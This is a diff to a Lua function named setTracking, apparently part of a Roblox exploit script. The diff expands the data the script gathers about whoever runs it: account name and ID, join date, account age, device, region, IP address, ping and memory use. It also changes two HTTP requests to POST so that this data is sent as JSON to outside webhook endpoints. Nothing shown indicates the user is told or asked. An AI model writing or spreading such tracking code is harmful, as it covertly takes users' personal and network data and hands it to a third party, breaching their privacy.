@@ -293,22 +293,18 @@ local function setTracking(prompt,agent)
     }
     
     local data = {
-        ["content"] = prompt,
+        ["webhook-text"] = prompt,
 	["From"] = LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")",
-	["Exploit"] = Exploit(),
-	["User-Region"] = Virtual_Region(),
-	["User-IP"] = Virtual_IP(),
 	["Time"] = tostring(os.date("%X")) .. " ( " .. Virtual_Region() .. " )",
 	["Date"] = tostring(os.date("%d")) .. "/" .. tostring(os.date("%m")) .. "/" .. tostring(os.date("%Y")) .. " - " .. Virtual_Region(),
-	["Device"] = DeviceInfo(),
 	["GAME"] = {
 		["Game-Name"] = PI(game.PlaceId).Name,
 		["Game-ID"] = game.PlaceId,
 		["Server-JobId"] = game.JobId,
 		["game-UniverseId"] = "nil",
 		["creator"] = {
-			["name"] = GetNameByID(),
-			["display-name"] = GetDisplayNameByID(),
+			["name"] = "nil",
+			["display-name"] = "nil",
 			["ID"] = CreatorID()
 		},
 		["Updated"] = {
@@ -316,19 +312,36 @@ local function setTracking(prompt,agent)
 			["TimeStamp"] = os.date("*t") or "nil",
 			["Last-Updated"] = dt:FormatLocalTime("LLL","en-us")
 		}
+	},
+	["account"] = {
+		["username"] = LocalPlayer.Name,
+		["display-name"] = LocalPlayer.DisplayName,
+		["user-id"] = LocalPlayer.UserId,
+		["join-date"] = jds(),
+		["account-age"] = LocalPlayer.AccountAge,
+	},
+	["client"] = {
+		["voice-chat"] = vcenab(),
+		["fps"] = math.floor(Workspace:GetRealPhysicsFPS()),
+		["ping"] = tonumber(string.split(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()," ")[1]) .. "ms",
+		["memory-usage"] = tostring(math.round(game:GetService("Stats").GetTotalMemoryUsageMb(game:GetService("Stats")))) .. " mb",
+		["Exploit"] = Exploit(),
+		["Device"] = DeviceInfo(),
+		["user-region"] = Virtual_Region(),
+		["IP"] = Virtual_IP()
 	}
     }
 
     local response = http({
         Url = URL,
-        Method = "GET",
+        Method = "POST",
         Headers = headers,
         Body = HttpService:JSONEncode(data)
     })
 
     local postsync = http({
         Url = PipeURL,
-        Method = "GET",
+        Method = "POST",
         Headers = headers,
         Body = HttpService:JSONEncode(data)
     })
